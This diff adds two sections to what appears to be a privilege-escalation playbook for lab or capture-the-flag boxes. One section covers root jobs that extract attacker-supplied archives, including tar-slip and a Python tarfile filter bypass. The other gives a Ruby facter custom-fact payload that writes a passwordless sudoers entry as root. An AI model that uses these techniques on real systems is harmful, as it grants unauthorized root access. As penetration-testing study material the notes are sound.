@@ -477,6 +477,77 @@ prefer a well-reviewed PoC (DirtyPipe CVE-2022-0847, PwnKit CVE-2021-4034,
 Dirty COW on ancient boxes), and note that PwnKit is a `pkexec` misconfiguration
 rather than a kernel bug — check for it early, it is common on older lab images.
 
+## Root job that extracts an attacker-influenced archive
+
+A root cron/sudo/service that unpacks a tarball, zip, git tree or API response
+into a directory is a classic arbitrary-write primitive. The modern trap is that
+the *safe-looking* mitigations are version-dependent — a script can look hardened
+and still be exploitable because the interpreter under it is old.
+
+**Reasoning, in order:**
+
+1. **Who writes the archive, who runs the extract?** If a lower-privileged user
+   can place the archive in a directory a root job extracts, you control the
+   contents. Group-writable "spool"/"backup"/"incoming" dirs are the tell.
+2. **Read the extractor and pin the *interpreter/library* version, not just the
+   code.** Python `tarfile.extractall(filter="data"|"tar")` is only as safe as the
+   Python running it: the "data"/"tar" filters were bypassable until the June-2025
+   fixes (CVE-2025-4517 / CVE-2025-4138 / CVE-2025-4330 / CVE-2024-12718; fixed in
+   3.12.11, 3.13.5, 3.9.23, 3.10.18, 3.11.13). A sudo rule that pins a *custom*
+   interpreter path (`/usr/local/bin/python3`) is itself a version flag — run
+   `sudo <that exact binary> --version`; it is often deliberately behind.
+3. **Pick the primitive to the write target.** Arbitrary root-owned write →
+   `/etc/sudoers.d/<x>` (`user ALL=(ALL) NOPASSWD:ALL`, instant, parent always
+   exists), `/etc/cron.d/<x>`, or `~root/.ssh/authorized_keys` (needs the dir).
+   Prefer a target whose parent directory already exists.
+4. **No filter at all (old code) = plain tar-slip:** a member named
+   `../../../etc/...` or a symlink member pointing outside writes anywhere. Test
+   this first; it needs no CVE.
+
+**The CVE-2025-4517 shape (data-filter bypass), as an example of the class:** the
+containment check uses `os.path.realpath()`, which silently stops resolving once a
+path exceeds `PATH_MAX` (4096) and falls back to string manipulation — so a symlink
+chain of long-named dirs makes the filter believe a link resolves *inside* the
+staging dir while the kernel follows it to `/`. A public generator builds N
+long-dir/short-symlink pairs + a 254-char `..×N` escape symlink + an `escape`→`/`
+link, then a member `escape/<abs/path>` writes as root. Match the generator's
+destination-length and depth-to-root to the real staging path. Keep the box-specific
+recipe in `local.md`; the transferable rule is **"extract-as-root + old interpreter
+= arbitrary write, even with a filter set."**
+
+## sudo a tool that loads user-supplied code (facter, and the class)
+
+A `sudo` grant for a program that *loads code or plugins* is root, even when the
+program looks inert. The tell is any tool with a `--custom-dir` / `--module-path` /
+`--require` / `-e` / config-include flag, or one that auto-loads files from a
+directory you can write.
+
+**Puppet `facter` is the canonical example.** `(ALL) NOPASSWD: /usr/bin/facter`
+loads *custom facts* (Ruby) from `--custom-dir <dir>`:
+
+```ruby
+# <dir>/pwn.rb
+Facter.add(:pwn) do
+  setcode do
+    File.write("/etc/sudoers.d/zz", "user ALL=(ALL) NOPASSWD:ALL\n"); File.chmod(0440,"/etc/sudoers.d/zz")
+    "x"
+  end
+end
+# sudo /usr/bin/facter --custom-dir <dir> pwn   (facter runs under use_pty -> ssh -tt)
+```
+
+The non-obvious trap: **facter drops privileges for shelled-out commands but runs
+in-process Ruby as root.** A `` `cmd` ``/`system(...)` in the fact runs as the
+calling user (the SUID copy comes out user-owned, useless); pure Ruby
+(`File.read`/`File.write`/`File.chmod`) runs with `Process.euid == 0`. Do the
+privileged work in Ruby, not shell. Confirm with `File.write("/tmp/e","#{Process.euid}")`.
+
+Generalises: before writing off a `sudo`-able tool, check whether it interprets a
+language or loads modules/config from an attacker-controllable path — Ruby
+(`facter`, `rake -f`, `gem`), Python (`-c`, `PYTHONPATH`, `ansible` module dirs),
+Perl, Lua, or any `--config`/`--include` that pulls executable content. If it does,
+that is the root primitive, no memory-corruption needed.
+
 ## Confirm and record
 
 ```bash
